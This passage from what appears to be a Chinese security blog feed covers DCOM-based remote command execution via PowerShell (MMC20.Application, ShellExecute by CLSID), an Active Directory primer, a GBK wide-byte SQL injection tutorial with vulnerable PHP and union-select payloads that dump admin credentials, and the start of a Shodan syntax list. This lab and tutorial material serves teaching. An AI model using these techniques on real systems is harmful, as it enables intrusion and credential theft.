<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/1.png" alt></p>
<p>注意：<br><code>Get-CimInstance</code> 只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
<p>当然，直接使用wmic查询也可以，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET &#x2F;all &#x2F;FORMAT:list</span><br></pre></td></tr></table></figure>
<p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/</a></p>
<h4 id="对本机测试"><a href="#对本机测试" class="headerlink" title="对本机测试"></a>对本机测试</h4><p>管理员权限，powershell代码如下:<br>获得”MMC20.Application”支持的操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView | Get-Member</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/2.png" alt></p>
<p><strong>查看ExecuteShellCommand对应的参数说明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/3.png" alt></p>
<p>ExecuteShellCommand 对应的参数具体含义可参考以下链接：</p>
<p><a href="https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx</a></p>
<p>通过ExecuteShellCommand执行程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
<h4 id="对远程系统测试"><a href="#对远程系统测试" class="headerlink" title="对远程系统测试"></a>对远程系统测试</h4><p><strong>调用MMC20.Application</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.72.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/4.png" alt></p>
<p>win7查看后台程序列表<br><img src="/posts/35747/5.png" alt></p>
<p><strong>调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/6.png" alt></p>
<p><strong>注意：</strong></p>
<p>以上两种方式适用于Win7-Win10</p>
]]></content>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透基础总结</title>
    <url>/posts/44578.html</url>
    <content><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
<h2 id="0x01-工作组、家庭组、域"><a href="#0x01-工作组、家庭组、域" class="headerlink" title="0x01 工作组、家庭组、域"></a>0x01 工作组、家庭组、域</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul>
<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
<li>通常情况下，计算机的数量不超过二十台。</li>
<li>工作组不受密码保护。</li>
<li>所有的计算机必须在同一本地网络或子网中。</li>
</ul>
<h3 id="家庭组"><a href="#家庭组" class="headerlink" title="家庭组"></a>家庭组</h3><ul>
<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
</ul>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
<p>域控制器（ Domain Controller ，简写为 DC ）可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
<ul>
<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 </li>
<li>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li>
<li>域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
</ul>
<h2 id="0x02-域的分类"><a href="#0x02-域的分类" class="headerlink" title="0x02 域的分类"></a>0x02 域的分类</h2><ul>
<li>单域</li>
<li>父域、子域</li>
<li>域树</li>
<li>域森林</li>
<li>DNS域名服务器</li>
</ul>
<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
<p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
<h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
<p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p>
<p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
<p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p>
<p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><ul>
<li><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p>
</li>
<li><p>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
</li>
<li><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
</li>
</ul>
<p>abc.com 是一级域</p>
<p>asia是二级域</p>
<p><img src="/posts/44578/1.png" alt></p>
<h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p>
<p><img src="/posts/44578/2.png" alt></p>
<h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><ul>
<li>DNS域名服务器是进行域名和与之对应的IP地址转换的服务器。</li>
<li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等等。</li>
<li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li>
</ul>
<h2 id="0x03-活动目录-AD"><a href="#0x03-活动目录-AD" class="headerlink" title="0x03 活动目录(AD)"></a>0x03 活动目录(AD)</h2><ul>
<li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li>
<li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li>
<li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li>
</ul>
<p>**<br>逻辑结构**</p>
<ul>
<li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>”。</li>
<li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li>
</ul>
<p><strong>活动目录的主要功能</strong></p>
<ol>
<li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li>
<li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
<li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li>
<li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li>
<li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li>
</ol>
<h2 id="0x04-AD和DC的区别"><a href="#0x04-AD和DC的区别" class="headerlink" title="0x04 AD和DC的区别"></a>0x04 AD和DC的区别</h2><ul>
<li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li>
<li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li>
<li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li>
</ul>
<h2 id="0x05-域相关概念"><a href="#0x05-域相关概念" class="headerlink" title="0x05 域相关概念"></a>0x05 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
<p><img src="/posts/44578/3.png" alt></p>
<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul>
<li>两个防火墙之间的空间被称为DMZ。</li>
<li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li>
<li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li>
<li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li>
<li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li>
</ul>
<h2 id="0x06-域中计算机分类"><a href="#0x06-域中计算机分类" class="headerlink" title="0x06 域中计算机分类"></a>0x06 域中计算机分类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域控制器</span><br><span class="line">成员服务器</span><br><span class="line">客户机</span><br><span class="line">独立服务器</span><br></pre></td></tr></table></figure>

<ul>
<li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li>
<li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li>
</ul>
<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>今天就先写到这，回头再查点资料，再补充补充。。。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title>宽字节注入</title>
    <url>/posts/4387.html</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/20190503152535594.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。</p>
<p>GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节</p>
<p>GBK编码:<br><img src="https://img-blog.csdnimg.cn/20190503151851416.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt="GBK编码"></p>
<p>utf-8编码：<br><img src="https://img-blog.csdnimg.cn/20190503152339583.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt="utf-8编码"><br>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数<code>addslashes</code>，<code>mysql_real_escape_string</code>，<code>mysql_escape_string</code>等。</p>
<p>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为<code>\’</code>，其中<code>\</code>的十六进制是<code>%5c</code>,mysql的GBK编码，会认为<code>%df%5c</code>是一个宽字节，也就是<code>運</code>，从而使单引号闭合（逃逸），进行注入攻击。</p>
<p>以下是数据的变化过程:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;&gt;(addslashes)&#x3D;&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;&#x3D;&gt;(GBK)&#x3D;&#x3D;&#x3D;&#x3D;&gt;運’</span><br><span class="line">​</span><br><span class="line">用户输入&#x3D;&#x3D;&gt;过滤函数&#x3D;&#x3D;&gt;代码层的$sql&#x3D;&#x3D;&gt;mysql处理请求&#x3D;&#x3D;&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建及分析"><a href="#环境搭建及分析" class="headerlink" title="环境搭建及分析"></a>环境搭建及分析</h2><h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>链接：<a href="https://pan.baidu.com/s/1cMFtCpbbaocMjaWJx7YLcQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1cMFtCpbbaocMjaWJx7YLcQ</a> 密码：ykve<br>数据库名为test，数据库的编码全部为gbk。<br>将index.php放到phpStudy的WWW目录下，将test.sql文件导入到数据库中即可<br><strong>核心源码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;连接数据库部分，注意使用了gbk编码</span><br><span class="line">$conn &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;) or die(&#39;bad!&#39;);</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br><span class="line">mysql_select_db(&#39;test&#39;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class="line">&#x2F;&#x2F;执行sql语句</span><br><span class="line">$id &#x3D; isset($_GET[&#39;id&#39;]) ? addslashes($_GET[&#39;id&#39;]) : 1;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM news WHERE tid&#x3D;&#39;&#123;$id&#125;&#39;&quot;;</span><br><span class="line">$result &#x3D; mysql_query($sql, $conn) or die(mysql_error());</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;gbk&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;宽字节测试&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;test.php&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">   &lt;b&gt;请输入值：&lt;&#x2F;b&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;id&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$row &#x3D; mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line">echo &quot;&lt;h2&gt;&#123;$row[&#39;title&#39;]&#125;&lt;&#x2F;h2&gt;&lt;p&gt;&#123;$row[&#39;content&#39;]&#125;&lt;p&gt;\n&quot;;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>sql语句是<code>SELECT * FROM news WHERE tid=&#39;{$id}</code>根据id从数据库表中获取信息。</p>
<p>单纯加上单引号没有报错，说明addslashes函数发挥了作用，将<code>&#39;</code> –&gt; <code>\&#39;</code>，这样就不会存在注入了。<br><img src="https://img-blog.csdnimg.cn/2019050320451741.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt><br>执行的SQL语句是：<code>SELECT * FROM news WHERE tid=&#39;1\&#39;&#39;</code></p>
<p>此时，在单引号前面加上前面讲的<code>%df</code>,使mysql认为<code>%df\</code>是一个汉字，这样<code>’</code>就可以逃逸出来，使<code>tid=&#39;1&#39;</code>闭合。<br><img src="https://img-blog.csdnimg.cn/20190503205449742.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>这时候，按说是可以构造查询语句了，可是为什么还在报错呢，因为<code>tid=&#39;1&#39;</code>后面的<code>&#39;</code>没有闭合，需要使用注释符号(– ‘或#)将这个多余的<code>’</code>注释掉，这样就可以构造注入语句了。<br><img src="https://img-blog.csdnimg.cn/20190503205816304.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>执行的SQL语句是：<code>SELECT * FROM news WHERE tid=&#39;-1 運&#39; -- \&#39;&#39;</code></p>
<p>下面就可以按照手动注入的思路进行数据的获取了。</p>
<p><strong>确定表的字段数</strong><br>经过order by查询，测得字段为3.<br><img src="https://img-blog.csdnimg.cn/20190503210033365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p><strong>确定字段的显示位</strong><br>显示位：表中数据第几位的字段可以 显示，因为并不是所有的查询结果都 会展示在页面中，因此需要探测页面 中展示的查询结果是哪一列的结果; <code>union select 1,2,3</code> 通过显示的数字可以判断那些字段可以显示出来。<br><img src="https://img-blog.csdnimg.cn/20190503210400588.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>执行的SQL语句是：<code>SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,3 -- \&#39;&#39;</code></p>
<p>id的值要用<code>-1</code>或者该表中没有用过的id值，否则测试值会被覆盖。</p>
<p><strong>获取当前数据库信息</strong><br>现在只有两个字段可以显示信息，显然在后面的查询数据中，两个字段是不够用，可以使用：group_concat()函数（可以把查询出来的多行数据连接起来在一个字段中显示） database()函数：查看当前数据库名称 version()函数：查看数据库版本信息 user():返回当前数据库连接使用的用户 char():将十进制ASCII码转化成字符。<br><img src="https://img-blog.csdnimg.cn/20190503210649881.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>执行的SQL语句：<code>SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(database()) -- \&#39;&#39;</code></p>
<p>当前数据库名为’test’。</p>
<p><strong>获取test数据库中的表信息</strong><br>Mysql有一个系统的数据库information_schema,里面保存着所有数据库的相关信息，使用该表完成注入<br><img src="https://img-blog.csdnimg.cn/20190503211303236.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>执行的SQL语句：<code>SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=test -- \&#39;&#39;</code></p>
<p>由于存在<code>addslashes</code>转义了单引号，如果在table_schema中继续使用单引号包裹数据库名字，就会报错，这时候需要使用十六进制编码来避免这个问题。</p>
<p><strong>获取admin表的字段</strong><br>column_name表示获取字段名</p>
<p><img src="https://img-blog.csdnimg.cn/20190503211759318.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>执行的SQL语句：<code>SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=admin -- \&#39;&#39;</code></p>
<p>table_name需要使用十六进制编码</p>
<p><strong>获取admin表的数据</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20190503215633404.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>执行的SQL语句：<code>SELECT * FROM news WHERE tid=&#39;-1 運&#39; union select 1,2,group_concat(uid,name,pass) from admin -- \&#39;&#39;</code></p>
<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><p>题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a><br>简单尝试一下：<br><img src="https://img-blog.csdnimg.cn/20190503212634776.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p><img src="https://img-blog.csdnimg.cn/20190503212846812.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p>很明显的宽字节注入。</p>
<p><strong>判断列数：</strong><br>经过order by测试，列数为2<br><img src="https://img-blog.csdnimg.cn/20190503213803690.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p><strong>库名：</strong><br>当前数据库<br><img src="https://img-blog.csdnimg.cn/20190503214218323.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt="当前数据库"></p>
<p><strong>表名：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20190503214533314.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p><strong>列名</strong><br>由于不知道flag在哪个表中，只能一个个去试。。。<br>最终在ctf4中得到flag。<br><img src="https://img-blog.csdnimg.cn/20190503214930351.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<p><strong>爆数据</strong><br><img src="https://img-blog.csdnimg.cn/20190503215228962.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjMyMDEy,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>上面的题目用SQLmap也能跑出来，不过作为一个手工党，基本的手工注入还是要会的。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索引擎</title>
    <url>/posts/20144.html</url>
    <content><![CDATA[<h2 id="0x00-Shodon"><a href="#0x00-Shodon" class="headerlink" title="0x00 Shodon"></a>0x00 Shodon</h2><p>Shodon可以进行全球的设备搜索，物联天下，shodan第一。</p>
<p><img src="/posts/20144/1.png" alt></p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>搜索语法：</strong></p>
<ul>
<li>hostname: 搜索指定的主机或域名，例如，hostname:”google”</li>
<li>port: 搜索指定的端口或服务，例如，port:”21”</li>
<li>country: 搜索指定的国家，例如，country:”CN”</li>
<li>city: 搜索指定的城市，例如，city:”Zhengzhou”</li>
<li>org: 搜索指定的组织或公司，例如，org:”baidu”</li>
